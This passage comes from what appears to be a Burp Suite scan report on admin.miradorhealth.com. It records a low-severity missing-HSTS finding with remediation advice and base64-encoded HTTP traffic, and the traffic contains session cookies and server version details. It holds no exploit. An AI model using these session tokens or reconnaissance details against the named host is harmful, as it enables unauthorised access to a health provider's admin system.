      <response base64="true"><![CDATA[SFRUUC8yIDMwMiBGb3VuZA0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogMA0KTG9jYXRpb246IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4NClNldC1Db29raWU6IEFXU0FMQj1ZWHI1L0taa3AxTEVVRUtwVlFhM2g0YU1YM1c3dm11OURYZGFPS2UvWi9SZWZteCs0ZXdjNkFma3NTcS93ZHlmVXV1N0E2ZkRpdlliYW40MlpIeTJRWWE1N3drbGxUSjVjdjZqU1Mxd1g2NHN3RzRhUVN5YjhiSXF5R1pCOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6Mjk6MDYgR01UOyBQYXRoPS8NClNldC1Db29raWU6IEFXU0FMQkNPUlM9WVhyNS9LWmtwMUxFVUVLcFZRYTNoNGFNWDNXN3ZtdTlEWGRhT0tlL1ovUmVmbXgrNGV3YzZBZmtzU3Evd2R5ZlV1dTdBNmZEaXZZYmFuNDJaSHkyUVlhNTd3a2xsVEo1Y3Y2alNTMXdYNjRzd0c0YVFTeWI4YklxeUdaQjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjI5OjA2IEdNVDsgUGF0aD0vOyBTYW1lU2l0ZT1Ob25lOyBTZWN1cmUNClNlcnZlcjogQXBhY2hlLzIuNC41MiAoKSBQSFAvOC4yLjkNClgtUG93ZXJlZC1CeTogUEhQLzguMi45DQpTZXQtQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHBhdGg9Lw0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4161099252744971264</serialNumber>
    <type>16777984</type>
    <name><![CDATA[Strict transport security not enforced]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p> The application fails to prevent users from connecting  to it over unencrypted connections.  An attacker able to modify a legitimate user's network traffic could bypass the application's use of SSL/TLS encryption, and use the application as a platform for attacks against its users. This attack is performed by rewriting HTTPS links as HTTP, so that if a targeted user follows a link to the site from an HTTP page, their browser never attempts to use an encrypted connection. The sslstrip tool  automates this process. </p>
<p>
To exploit this vulnerability, an attacker must be suitably positioned to intercept and modify the victim's network traffic.This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The application should instruct web browsers to only access the application using HTTPS. To do this, enable HTTP Strict Transport Security (HSTS) by adding a response header with the name 'Strict-Transport-Security' and the value 'max-age=expireTime', where expireTime is the time in seconds that browsers should remember that the site should only be accessed using HTTPS. Consider adding the 'includeSubDomains' flag if appropriate.</p>
<p>Note that because HSTS is a &quot;trust on first use&quot; (TOFU) protocol, a user who has never accessed the application will never have seen the HSTS header, and will therefore still be vulnerable to SSL stripping attacks. To mitigate this risk, you can optionally add the 'preload' flag to the HSTS header, and submit the domain for review by browser vendors.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security">HTTP Strict Transport Security</a></li><li><a href="https://github.com/moxie0/sslstrip">sslstrip</a></li><li><a href="https://hstspreload.appspot.com/">HSTS Preload Form</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/523.html">CWE-523: Unprotected Transport of Credentials</a></li><li><a href="https://capec.mitre.org/data/definitions/94.html">CAPEC-94: Man in the Middle Attack</a></li><li><a href="https://capec.mitre.org/data/definitions/157.html">CAPEC-157: Sniffing Attacks</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[This issue was found in multiple locations under the reported path.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IEFXU0FMQj11d1pjYzE4SlF0WEt0Y2YzNWtGc1NHTzdtMnh3YVo0cm00SWs2UmJUSGRWUkJVdVNPWFNCVzV1RnVjeDJ0MkhwTGRjZWg3SGJ0YzRLSGZkSTlPQmlRNVdaUDVZTk9NYkhmdHZXY1dBbFZuTFh0OVdqMFJxUFd5dm0zdGFFOyBBV1NBTEJDT1JTPXV3WmNjMThKUXRYS3RjZjM1a0ZzU0dPN20yeHdhWjRybTRJazZSYlRIZFZSQlV1U09YU0JXNXVGdWN4MnQySHBMZGNlaDdIYnRjNEtIZmRJOU9CaVE1V1pQNVlOT01iSGZ0dldjV0FsVm5MWHQ5V2owUnFQV3l2bTN0YUUNClNlYy1DaC1VYS1QbGF0Zm9ybTogIkxpbnV4Ig0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KU2VjLUNoLVVhOiAiQ2hyb21pdW0iO3Y9IjEzMSIsICJOb3RfQSBCcmFuZCI7dj0iMjQiDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuNjc3OC44NiBTYWZhcmkvNTM3LjM2DQpTZWMtQ2gtVWEtTW9iaWxlOiA/MA0KQWNjZXB0OiB0ZXh0L2NzcywqLyo7cT0wLjENClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLU1vZGU6IG5vLWNvcnMNClNlYy1GZXRjaC1EZXN0OiBzdHlsZQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9MA0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzoyOTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9jc3MNCkNvbnRlbnQtTGVuZ3RoOiAzMTAwMA0KU2V0LUNvb2tpZTogQVdTQUxCPVhQUjNTeVR6VWRhVnBNd0V1WUpxeWxZU1htdkw5OWRCN3JjVXZkKzhqcUNPdDJaME02YSthTDF6ZHpDaDd3Ukx4Sit3Sit3MTgyQTNndVpNMzRvcFpVMGx3Q2pwaG1BU1plNDlNSkZwV3JrVVBkeGdVNDcrbXN5RTE0cy87IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzoyOTowNiBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz1YUFIzU3lUelVkYVZwTXdFdVlKcXlsWVNYbXZMOTlkQjdyY1V2ZCs4anFDT3QyWjBNNmErYUwxemR6Q2g3d1JMeEord0ordzE4MkEzZ3VaTTM0b3BaVTBsd0NqcGhtQVNaZTQ5TUpGcFdya1VQZHhnVTQ3K21zeUUxNHMvOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6Mjk6MDYgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KTGFzdC1Nb2RpZmllZDogVGh1LCAxOCBKYW4gMjAyNCAwNzoxMjozMCBHTVQNCkV0YWc6ICI3OTE4LTYwZjMzMTYzMDFiNWMiDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KDQovKiEKICogIEZvbnQgQXdlc29tZSA0LjcuMCBieSBAZGF2ZWdhbmR5IC0gaHR0cDovL2ZvbnRhd2Vzb21lLmlvIC0gQGZvbnRhd2Vzb21lCiAqICBMaWNlbnNlIC0gaHR0cDovL2ZvbnRhd2Vzb21lLmlvL2xpY2Vuc2UgKEZvbnQ6IFNJTCBPRkwgMS4xLCBDU1M6IE1JVCBMaWNlbnNlKQogKi9AZm9udC1mYWNle2ZvbnQtZmFtaWx5OidGb250QXdlc29tZSc7c3JjOnVybCgnLi4vZm9udHMvZm9udGF3ZXNvbWUtd2ViZm9udC5lb3Q/dj00LjcuMCcpO3NyYzp1cmwoJy4uL2ZvbnRzL2ZvbnRhd2Vzb21lLXdlYmZvbnQuZW90PyNpZWZpeCZ2PTQuNy4wJykgZm9ybWF0KCdlbWJlZGRlZC1vcGVudHlwZScpLHVybCgnLi4vZm9udHMvZm9udGF3ZXNvbWUtd2ViZm9udC53b2ZmMj92PTQuNy4wJykgZm9ybWF0KCd3b2ZmMicpLHVybCgnLi4vZm9udHMvZm9udGF3ZXNvbWUtd2ViZm9udC53b2ZmP3Y9NC43LjAnKSBmb3JtYXQoJ3dvZmYnKSx1cmwoJy4uL2ZvbnRzL2ZvbnRhd2Vzb21lLXdlYmZvbnQudHRmP3Y9NC43LjAnKSBmb3JtYXQoJ3RydWV0eXBlJyksdXJsKCcuLi9mb250cy9mb250YXdlc29tZS13ZWJmb250LnN2Zz92PTQuNy4wI2ZvbnRhd2Vzb21lcmVndWxhcicpIGZvcm1hdCgnc3ZnJyk7Zm9udC13ZWlnaHQ6bm9ybWFsO2ZvbnQtc3R5bGU6bm9ybWFsfS5mYXtkaXNwbGF5OmlubGluZS1ibG9jaztmb250Om5vcm1hbCBub3JtYWwgbm9ybWFsIDE0cHgvMSBGb250QXdlc29tZTtmb250LXNpemU6aW5oZXJpdDt0ZXh0LXJlbmRlcmluZzphdXRvOy13ZWJraXQtZm9udC1zbW9vdGhpbmc6YW50aWFsaWFzZWQ7LW1vei1vc3gtZm9udC1zbW9vdGhpbmc6Z3JheXNjYWxlfS5mYS1sZ3tmb250LXNpemU6MS4zMzMzMzMzM2VtO2xpbmUtaGVpZ2h0Oi43NWVtO3ZlcnRpY2FsLWFsaWduOi0xNSV9LmZhLTJ4e2ZvbnQtc2l6ZToyZW19LmZhLTN4e2ZvbnQtc2l6ZTozZW19LmZhLTR4e2ZvbnQtc2l6ZTo0ZW19LmZhLTV4e2ZvbnQtc2l6ZTo1ZW19LmZhLWZ3e3dpZHRoOjEuMjg1NzE0MjllbTt0ZXh0LWFsaWduOmNlbnRlcn0uZmEtdWx7cGFkZGluZy1sZWZ0OjA7bWFyZ2luLWxlZnQ6Mi4xNDI4NTcxNGVtO2xpc3Qtc3R5bGUtdHlwZTpub25lfS5mYS11bD5saXtwb3NpdGlvbjpyZWxhdGl2ZX0uZmEtbGl7cG9zaXRpb246YWJzb2x1dGU7bGVmdDotMi4xNDI4NTcxNGVtO3dpZHRoOjIuMTQyODU3MTRlbTt0b3A6LjE0Mjg1NzE0ZW07dGV4dC1hbGlnbjpjZW50ZXJ9LmZhLWxpLmZhLWxne2xlZnQ6LTEuODU3MTQyODZlbX0uZmEtYm9yZGVye3BhZGRpbmc6LjJlbSAuMjVlbSAuMTVlbTtib3JkZXI6c29saWQgLjA4ZW0gI2VlZTtib3JkZXItcmFkaXVzOi4xZW19LmZhLXB1bGwtbGVmdHtmbG9hdDpsZWZ0fS5mYS1wdWxsLXJpZ2h0e2Zsb2F0OnJpZ2h0fS5mYS5mYS1wdWxsLWxlZnR7bWFyZ2luLXJpZ2h0Oi4zZW19LmZhLmZhLXB1bGwtcmlnaHR7bWFyZ2luLWxlZnQ6LjNlbX0ucHVsbC1yaWdodHtmbG9hdDpyaWdodH0ucHVsbC1sZWZ0e2Zsb2F0OmxlZnR9LmZhLnB1bGwtbGVmdHttYXJnaW4tcmlnaHQ6LjNlbX0uZmEucHVsbC1yaWdodHttYXJnaW4tbGVmdDouM2VtfS5mYS1zcGluey13ZWJraXQtYW5pbWF0aW9uOmZhLXNwaW4gMnMgaW5maW5pdGUgbGluZWFyO2FuaW1hdGlvbjpmYS1zcGluIDJzIGluZmluaXRlIGxpbmVhcn0uZmEtcHVsc2V7LXdlYmtpdC1hbmltYXRpb246ZmEtc3BpbiAxcyBpbmZpbml0ZSBzdGVwcyg4KTthbmltYXRpb246ZmEtc3BpbiAxcyBpbmZpbml0ZSBzdGVwcyg4KX1ALXdlYmtpdC1rZXlmcmFtZXMgZmEtc3BpbnswJXstd2Via2l0LXRyYW5zZm9ybTpyb3RhdGUoMGRlZyk7dHJhbnNmb3JtOnJvdGF0ZSgwZGVnKX0xMDAley13ZWJraXQtdHJhbnNmb3JtOnJvdGF0ZSgzNTlkZWcpO3RyYW5zZm9ybTpyb3RhdGUoMzU5ZGVnKX19QGtleWZyYW1lcyBmYS1zcGluezAley13ZWJraXQtdHJhbnNmb3JtOnJvdGF0ZSgwZGVnKTt0cmFuc2Zvcm06cm90YXRlKDBkZWcpfTEwMCV7LXdlYmtpdC10cmFuc2Zvcm06cm90YXRlKDM1OWRlZyk7dHJhbnNmb3JtOnJvdGF0ZSgzNTlkZWcpfX0uZmEtcm90YXRlLTkwey1tcy1maWx0ZXI6InByb2dpZDpEWEltYWdlVHJhbnNmb3JtLk1pY3Jvc29mdC5CYXNpY0ltYWdlKHJvdGF0aW9uPTEpIjstd2Via2l0LXRyYW5zZm9ybTpyb3RhdGUoOTBkZWcpOy1tcy10cmFuc2Zvcm06cm90YXRlKDkwZGVnKTt0cmFuc2Zvcm06cm90YXRlKDkwZGVnKX0uZmEtcm90YXRlLTE4MHstbXMtZmlsdGVyOiJwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuQmFzaWNJbWFnZShyb3RhdGlvbj0yKSI7LXdlYmtpdC10cmFuc2Zvcm06cm90YXRlKDE4MGRlZyk7LW1zLXRyYW5zZm9ybTpyb3RhdGUoMTgwZGVnKTt0cmFuc2Zvcm06cm90YXRlKDE4MGRlZyl9LmZhLXJvdGF0ZS0yNzB7LW1zLWZpbHRlcjoicHJvZ2lkOkRYSW1hZ2VUcmFuc2Zvcm0uTWljcm9zb2Z0LkJhc2ljSW1hZ2Uocm90YXRpb249MykiOy13ZWJraXQtdHJhbnNmb3JtOnJvdGF0ZSgyNzBkZWcpOy1tcy10cmFuc2Zvcm06cm90YXRlKDI3MGRlZyk7dHJhbnNmb3JtOnJvdGF0ZSgyNzBkZWcpfS5mYS1mbGlwLWhvcml6b250YWx7LW1zLWZpbHRlcjoicHJvZ2lkOkRYSW1hZ2VUcmFuc2Zvcm0uTWljcm9zb2Z0LkJhc2ljSW1hZ2Uocm90YXRpb249MCwgbWlycm9yPTEpIjstd2Via2l0LXRyYW5zZm9ybTpzY2FsZSgtMSwgMSk7LW1zLXRyYW5zZm9ybTpzY2FsZSgtMSwgMSk7dHJhbnNmb3JtOnNjYWxlKC0xLCAxKX0uZmEtZmxpcC12ZXJ0aWNhbHstbXMtZmlsdGVyOiJwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuQmFzaWNJbWFnZShyb3RhdGlvbj0yLCBtaXJyb3I9MSkiOy13ZWJraXQtdHJhbnNmb3JtOnNjYWxlKDEsIC0xKTstbXMtdHJhbnNmb3JtOnNjYWxlKDEsIC0xKTt0cmFuc2Zvcm06c2NhbGUoMSwgLTEpfTpyb290IC5mYS1yb3RhdGUtOTAsOnJvb3QgLmZhLXJvdGF0ZS0xODAsOnJvb3QgLmZhLXJvdGF0ZS0yNzAsOnJvb3QgLmZhLWZsaXAtaG9yaXpvbnRhbCw6cm9vdCAuZmEtZmxpcC12ZXJ0aWNhbHtmaWx0ZXI6bm9uZX0uZmEtc3RhY2t7cG9zaXRpb246cmVsYXRpdmU7ZGlzcGxheTppbmxpbmUtYmxvY2s7d2lkdGg6MmVtO2hlaWdodDoyZW07bGluZS1oZWlnaHQ6MmVtO3ZlcnRpY2FsLWFsaWduOm1pZGRsZX0uZmEtc3RhY2stMXgsLmZhLXN0YWNrLTJ4e3Bvc2l0aW9uOmFic29sdXRlO2xlZnQ6MDt3aWR0aDoxMDAlO3RleHQtYWxpZ246Y2VudGVyfS5mYS1zdGFjay0xeHtsaW5lLWhlaWdodDppbmhlcml0fS5mYS1zdGFjay0yeHtmb250LXNpemU6MmVtfS5mYS1pbnZlcnNle2NvbG9yOiNmZmZ9LmZhLWdsYXNzOmJlZm9yZXtjb250ZW50OiJcZjAwMCJ9LmZhLW11c2ljOmJlZm9yZXtjb250ZW50OiJcZjAwMSJ9LmZhLXNlYXJjaDpiZWZvcmV7Y29udGVudDoiXGYwMDIifS5mYS1lbnZlbG9wZS1vOmJlZm9yZXtjb250ZW50OiJcZjAwMyJ9LmZhLWhlYXJ0OmJlZm9yZXtjb250ZW50OiJcZjAwNCJ9LmZhLXN0YXI6YmVmb3Jle2NvbnRlbnQ6IlxmMDA1In0uZmEtc3Rhci1vOmJlZm9yZXtjb250ZW50OiJcZjAwNiJ9LmZhLXVzZXI6YmVmb3Jle2NvbnRlbnQ6IlxmMDA3In0uZmEtZmlsbTpiZWZvcmV7Y29udGVudDoiXGYwMDgifS5mYS10aC1sYXJnZTpiZWZvcmV7Y29udGVudDoiXGYwMDkifS5mYS10aDpiZWZvcmV7Y29udGVudDoiXGYwMGEifS5mYS10aC1saXN0OmJlZm9yZXtjb250ZW50OiJcZjAwYiJ9LmZhLWNoZWNrOmJlZm9yZXtjb250ZW50OiJcZjAwYyJ9LmZhLXJlbW92ZTpiZWZvcmUsLmZhLWNsb3NlOmJlZm9yZSwuZmEtdGltZXM6YmVmb3Jle2NvbnRlbnQ6IlxmMDBkIn0uZmEtc2VhcmNoLXBsdXM6YmVmb3Jle2NvbnRlbnQ6IlxmMDBlIn0uZmEtc2VhcmNoLW1pbnVzOmJlZm9yZXtjb250ZW50OiJcZjAxMCJ9LmZhLXBvd2VyLW9mZjpiZWZvcmV7Y29udGVudDoiXGYwMTEifS5mYS1zaWduYWw6YmVmb3Jle2NvbnRlbnQ6IlxmMDEyIn0uZmEtZ2VhcjpiZWZvcmUsLmZhLWNvZzpiZWZvcmV7Y29udGVudDoiXGYwMTMifS5mYS10cmFzaC1vOmJlZm9yZXtjb250ZW50OiJcZjAxNCJ9LmZhLWhvbWU6YmVmb3Jle2NvbnRlbnQ6IlxmMDE1In0uZmEtZmlsZS1vOmJlZm9yZXtjb250ZW50OiJcZjAxNiJ9LmZhLWNsb2NrLW86YmVmb3Jle2NvbnRlbnQ6IlxmMDE3In0uZmEtcm9hZDpiZWZvcmV7Y29udGVudDoiXGYwMTgifS5mYS1kb3dubG9hZDpiZWZvcmV7Y29udGVudDoiXGYwMTkifS5mYS1hcnJvdy1jaXJjbGUtby1kb3duOmJlZm9yZXtjb250ZW50OiJcZjAxYSJ9LmZhLWFycm93LWNpcmNsZS1vLXVwOmJlZm9yZXtjb250ZW50OiJcZjAxYiJ9LmZhLWluYm94OmJlZm9yZXtjb250ZW50OiJcZjAxYyJ9LmZhLXBsYXktY2lyY2xlLW86YmVmb3Jle2NvbnRlbnQ6IlxmMDFkIn0uZmEtcm90YXRlLXJpZ2h0OmJlZm9yZSwuZmEtcmVwZWF0OmJlZm9yZXtjb250ZW50OiJcZjAxZSJ9LmZhLXJlZnJlc2g6YmVmb3Jle2NvbnRlbnQ6IlxmMDIxIn0uZmEtbGlzdC1hbHQ6YmVmb3Jle2NvbnRlbnQ6IlxmMDIyIn0uZmEtbG9jazpiZWZvcmV7Y29udGVudDoiXGYwMjMifS5mYS1mbGFnOmJlZm9yZXtjb250ZW50OiJcZjAyNCJ9LmZhLWhlYWRwaG9uZXM6YmVmb3Jle2NvbnRlbnQ6IlxmMDI1In0uZmEtdm9sdW1lLW9mZjpiZWZvcmV7Y29udGVudDoiXGYwMjYifS5mYS12b2x1bWUtZG93bjpiZWZvcmV7Y29udGVudDoiXGYwMjcifS5mYS12b2x1bWUtdXA6YmVmb3Jle2NvbnRlbnQ6IlxmMDI4In0uZmEtcXJjb2RlOmJlZm9yZXtjb250ZW50OiJcZjAyOSJ9LmZhLWJhcmNvZGU6YmVmb3Jle2NvbnRlbnQ6IlxmMDJhIn0uZmEtdGFnOmJlZm9yZXtjb250ZW50OiJcZjAyYiJ9LmZhLXRhZ3M6YmVmb3Jle2NvbnRlbnQ6IlxmMDJjIn0uZmEtYm9vazpiZWZvcmV7Y29udGVudDoiXGYwMmQifS5mYS1ib29rbWFyazpiZWZvcmV7Y29udGVudDoiXGYwMmUifS5mYS1wcmludDpiZWZvcmV7Y29udGVudDoiXGYwMmYifS5mYS1jYW1lcmE6YmVmb3Jle2NvbnRlbnQ6IlxmMDMwIn0uZmEtZm9udDpiZWZvcmV7Y29udGVudDoiXGYwMzEifS5mYS1ib2xkOmJlZm9yZXtjb250ZW50OiJcZjAzMiJ9LmZhLWl0YWxpYzpiZWZvcmV7Y29udGVudDoiXGYwMzMifS5mYS10ZXh0LWhlaWdodDpiZWZvcmV7Y29udGVudDoiXGYwMzQifS5mYS10ZXh0LXdpZHRoOmJlZm9yZXtjb250ZW50OiJcZjAzNSJ9LmZhLWFsaWduLWxlZnQ6YmVmb3Jle2NvbnRlbnQ6IlxmMDM2In0uZmEtYWxpZ24tY2VudGVyOmJlZm9yZXtjb250ZW50OiJcZjAzNyJ9LmZhLWFsaWduLXJpZ2h0OmJlZm9yZXtjb250ZW50OiJcZjAzOCJ9LmZhLWFsaWduLWp1c3RpZnk6YmVmb3Jle2NvbnRlbnQ6IlxmMDM5In0uZmEtbGlzdDpiZWZvcmV7Y29udGVudDoiXGYwM2EifS5mYS1kZWRlbnQ6YmVmb3JlLC5mYS1vdXRkZW50OmJlZm9yZXtjb250ZW50OiJcZjAzYiJ9LmZhLWluZGVudDpiZWZvcmV7Y29udGVudDoiXGYwM2MifS5mYS12aWRlby1jYW1lcmE6YmVmb3Jle2NvbnRlbnQ6IlxmMDNkIn0uZmEtcGhvdG86YmVmb3JlLC5mYS1pbWFnZTpiZWZvcmUsLmZhLXBpY3R1cmUtbzpiZWZvcmV7Y29udGVudDoiXGYwM2UifS5mYS1wZW5jaWw6YmVmb3Jle2NvbnRlbnQ6IlxmMDQwIn0uZmEtbWFwLW1hcmtlcjpiZWZvcmV7Y29udGVudDoiXGYwNDEifS5mYS1hZGp1c3Q6YmVmb3Jle2NvbnRlbnQ6IlxmMDQyIn0uZmEtdGludDpiZWZvcmV7Y29udGVudDoiXGYwNDMifS5mYS1lZGl0OmJlZm9yZSwuZmEtcGVuY2lsLXNxdWFyZS1vOmJlZm9yZXtjb250ZW50OiJcZjA0NCJ9LmZhLXNoYXJlLXNxdWFyZS1vOmJlZm9yZXtjb250ZW50OiJcZjA0NSJ9LmZhLWNoZWNrLXNxdWFyZS1vOmJlZm9yZXtjb250ZW50OiJcZjA0NiJ9LmZhLWFycm93czpiZWZvcmV7Y29udGVudDoiXGYwNDcifS5mYS1zdGVwLWJhY2t3YXJkOmJlZm9yZXtjb250ZW50OiJcZjA0OCJ9LmZhLWZhc3QtYmFja3dhcmQ6YmVmb3Jle2NvbnRlbnQ6IlxmMDQ5In0uZmEtYmFja3dhcmQ6YmVmb3Jle2NvbnRlbnQ6IlxmMDRhIn0uZmEtcGxheTpiZWZvcmV7Y29udGVudDoiXGYwNGIifS5mYS1wYXVzZTpiZWZvcmV7Y29udGVudDoiXGYwNGMifS5mYS1zdG9wOmJlZm9yZXtjb250ZW50OiJcZjA0ZCJ9LmZhLWZvcndhcmQ6YmVmb3Jle2NvbnRlbnQ6IlxmMDRlIn0uZmEtZmFzdC1mb3J3YXJkOmJlZm9yZXtjb250ZW50OiJcZjA1MCJ9LmZhLXN0ZXAtZm9yd2FyZDpiZWZvcmV7Y29udGVudDoiXGYwNTEifS5mYS1lamVjdDpiZWZvcmV7Y29udGVudDoiXGYwNTIifS5mYS1jaGV2cm9uLWxlZnQ6YmVmb3Jle2NvbnRlbnQ6IlxmMDUzIn0uZmEtY2hldnJvbi1yaWdodDpiZWZvcmV7Y29udGVudDoiXGYwNTQifS5mYS1wbHVzLWNpcmNsZTpiZWZvcmV7Y29udGVudDoiXGYwNTUifS5mYS1taW51cy1jaXJjbGU6YmVmb3Jle2NvbnRlbnQ6IlxmMDU2In0uZmEtdGltZXMtY2lyY2xlOmJlZm9yZXtjb250ZW50OiJcZjA1NyJ9LmZhLWNoZWNrLWNpcmNsZTpiZWZvcmV7Y29udGVudDoiXGYwNTgifS5mYS1xdWVzdGlvbi1jaXJjbGU6YmVmb3Jle2NvbnRlbnQ6IlxmMDU5In0uZmEtaW5mby1jaXJjbGU6YmVmb3Jle2NvbnRlbnQ6IlxmMDVhIn0uZmEtY3Jvc3NoYWlyczpiZWZvcmV7Y29udGVudDoiXGYwNWIifS5mYS10aW1lcy1jaXJjbGUtbzpiZWZvcmV7Y29udGVudDoiXGYwNWMifS5mYS1jaGVjay1jaXJjbGUtbzpiZWZvcmV7Y29udGVudDoiXGYwNWQifS5mYS1iYW46YmVmb3Jle2NvbnRlbnQ6IlxmMDVlIn0uZmEtYXJyb3ctbGVmdDpiZWZvcmV7Y29udGVudDoiXGYwNjAifS5mYS1hcnJvdy1yaWdodDpiZWZvcmV7Y29udGVudDoiXGYwNjEifS5mYS1hcnJvdy11cDpiZWZvcmV7Y29udGVudDoiXGYwNjIifS5mYS1hcnJvdy1kb3duOmJlZm9yZXtjb250ZW50OiJcZjA2MyJ9LmZhLW1haWwtZm9yd2FyZDpiZWZvcmUsLmZhLXNoYXJlOmJlZm9yZXtjb250ZW50OiJcZjA2NCJ9LmZhLWV4cGFuZDpiZWZvcmV7Y29udGVudDoiXGYwNjUifS5mYS1jb21wcmVzczpiZWZvcmV7Y29udGVudDoiXGYwNjYifS5mYS1wbHVzOmJlZm9yZXtjb250ZW50OiJcZjA2NyJ9LmZhLW1pbnVzOmJlZm9yZXtjb250ZW50OiJcZjA2OCJ9LmZhLWFzdGVyaXNrOmJlZm9yZXtjb250ZW50OiJcZjA2OSJ9LmZhLWV4Y2xhbWF0aW9uLWNpcmNsZTpiZWZvcmV7Y29udGVudDoiXGYwNmEifS5mYS1naWZ0OmJlZm9yZXtjb250ZW50OiJcZjA2YiJ9LmZhLWxlYWY6YmVmb3Jle2NvbnRlbnQ6IlxmMDZjIn0uZmEtZmlyZTpiZWZvcmV7Y29udGVudDoiXGYwNmQifS5mYS1leWU6YmVmb3Jle2NvbnRlbnQ6IlxmMDZlIn0uZmEtZXllLXNsYXNoOmJlZm9yZXtjb250ZW50OiJcZjA3MCJ9LmZhLXdhcm5pbmc6YmVmb3JlLC5mYS1leGNsYW1hdGlvbi10cmlhbmdsZTpiZWZvcmV7Y29udGVudDoiXGYwNzEifS5mYS1wbGFuZTpiZWZvcmV7Y29udGVudDoiXGYwNzIifS5mYS1jYWxlbmRhcjpiZWZvcmV7Y29udGVudDoiXGYwNzMifS5mYS1yYW5kb206YmVmb3Jle2NvbnRlbnQ6IlxmMDc0In0uZmEtY29tbWVudDpiZWZvcmV7Y29udGVudDoiXGYwNzUifS5mYS1tYWduZXQ6YmVmb3Jle2NvbnRlbnQ6IlxmMDc2In0uZmEtY2hldnJvbi11cDpiZWZvcmV7Y29udGVudDoiXGYwNzcifS5mYS1jaGV2cm9uLWRvd246YmVmb3Jle2NvbnRlbnQ6IlxmMDc4In0uZmEtcmV0d2VldDpiZWZvcmV7Y29udGVudDoiXGYwNzkifS5mYS1zaG9wcGluZy1jYXJ0OmJlZm9yZXtjb250ZW50OiJcZjA3YSJ9LmZhLWZvbGRlcjpiZWZvcmV7Y29udGVudDoiXGYwN2IifS5mYS1mb2xkZXItb3BlbjpiZWZvcmV7Y29udGVudDoiXGYwN2MifS5mYS1hcnJvd3MtdjpiZWZvcmV7Y29udGVudDoiXGYwN2QifS5mYS1hcnJvd3MtaDpiZWZvcmV7Y29udGVudDoiXGYwN2UifS5mYS1iYXItY2hhcnQtbzpiZWZvcmUsLmZhLWJhci1jaGFydDpiZWZvcmV7Y29udGVudDoiXGYwODAifS5mYS10d2l0dGVyLXNxdWFyZTpiZWZvcmV7Y29udGVudDoiXGYwODEifS5mYS1mYWNlYm9vay1zcXVhcmU6YmVmb3Jle2NvbnRlbnQ6IlxmMDgyIn0uZmEtY2FtZXJhLXJldHJvOmJlZm9yZXtjb250ZW50OiJcZjA4MyJ9LmZhLWtleTpiZWZvcmV7Y29udGVudDoiXGYwODQifS5mYS1nZWFyczpiZWZvcmUsLmZhLWNvZ3M6YmVmb3Jle2NvbnRlbnQ6IlxmMDg1In0uZmEtY29tbWVudHM6YmVmb3Jle2NvbnRlbnQ6IlxmMDg2In0uZmEtdGh1bWJzLW8tdXA6YmVmb3Jle2NvbnRlbnQ6IlxmMDg3In0uZmEtdGh1bWJzLW8tZG93bjpiZWZvcmV7Y29udGVudDoiXGYwODgifS5mYS1zdGFyLWhhbGY6YmVmb3Jle2NvbnRlbnQ6IlxmMDg5In0uZmEtaGVhcnQtbzpiZWZvcmV7Y29udGV